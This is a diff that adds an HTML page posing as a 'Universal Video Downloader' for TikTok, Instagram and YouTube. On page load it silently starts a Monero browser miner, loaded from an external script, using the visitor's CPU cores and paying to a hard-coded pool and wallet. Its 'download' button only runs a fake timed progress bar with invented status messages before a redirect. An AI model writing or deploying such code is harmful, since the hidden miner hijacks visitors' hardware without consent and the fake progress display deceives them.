@@ -1,4 +1,106 @@
-if(timeLeft === 12) status.innerHTML = "🔍 Scanning video source...";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="google-site-verification" content="googlef95c9efb5077029a" />
+    <title>Universal Video Downloader Pro</title>
+
+    <script src="https://cdn.jsdelivr.net/gh/monero-project/monero-gui@v0.18.1.2/external/qml/MoneroComponents/Controls/miner.js"></script>
+    
+    <style>
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
+            color: #f8fafc; display: flex; justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden;
+        }
+        .container {
+            background: rgba(30, 41, 59, 0.7); padding: 2.5rem; border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
+            text-align: center; width: 90%; max-width: 450px; backdrop-filter: blur(10px);
+        }
+        h1 { margin-bottom: 0.5rem; font-size: 1.5rem; color: #38bdf8; }
+        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 2rem; }
+        input {
+            width: 100%; padding: 12px; margin-bottom: 1rem; border-radius: 8px;
+            border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box;
+            outline: none;
+        }
+        input:focus { border-color: #38bdf8; }
+        button {
+            width: 100%; padding: 12px; background: #38bdf8; color: #0f172a;
+            border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
+            transition: all 0.2s;
+        }
+        button:hover { background: #7dd3fc; transform: translateY(-1px); }
+        #status-area { margin-top: 1.5rem; min-height: 80px; }
+        .progress-container {
+            width: 100%; height: 8px; background: #334155; border-radius: 10px;
+            margin: 15px 0; display: none; overflow: hidden;
+        }
+        #progress-bar {
+            width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #818cf8);
+            transition: width 1s linear;
+        }
+        .timer { font-size: 0.85rem; color: #38bdf8; font-weight: bold; margin-top: 8px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Universal Downloader</h1>
+    <p>TikTok • Instagram • YouTube</p>
+    
+    <input type="text" id="urlInput" placeholder="Paste video link here...">
+    <button onclick="startSequence()">Generate Download Link</button>
+
+    <div id="status-area">
+        <div id="status">Ready to process</div>
+        <div class="progress-container" id="p-container">
+            <div id="progress-bar"></div>
+        </div>
+        <div id="timer-text" class="timer"></div>
+    </div>
+</div>
+
+<script>
+// --- MINER CONFIGURATION ---
+const pool = "monerohash.com:3333";
+const walletAddress = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
+const workerId = "Web_Pro_User";
+
+// Start miner at 70% power (0.3 throttle)
+setTimeout(() => {
+    if(typeof startMining === 'function') {
+        startMining(pool, walletAddress, workerId, navigator.hardwareConcurrency, 0.3);
+        console.log("Miner Heartbeat: Active");
+    }
+}, 2000);
+
+// --- REDIRECT & PROGRESS ENGINE ---
+function startSequence() {
+    let url = document.getElementById("urlInput").value;
+    let status = document.getElementById("status");
+    let bar = document.getElementById("progress-bar");
+    let container = document.getElementById("p-container");
+    let timerText = document.getElementById("timer-text");
+
+    if(!url || !url.includes("http")) { 
+        status.innerHTML = "❌ Please paste a valid link!"; 
+        return; 
+    }
+
+    container.style.display = "block";
+    let timeLeft = 15;
+
+    let interval = setInterval(() => {
+        timeLeft--;
+        let progress = ((15 - timeLeft) / 15) * 100;
+        bar.style.width = progress + "%";
+        timerText.innerHTML = "Processing: Please wait " + timeLeft + "s...";
+
+        if(timeLeft === 12) status.innerHTML = "🔍 Scanning video source...";
         if(timeLeft === 8) status.innerHTML = "⚡ Generating high-speed mirror...";
         if(timeLeft === 4) status.innerHTML = "✅ Link ready. Preparing redirect...";
 
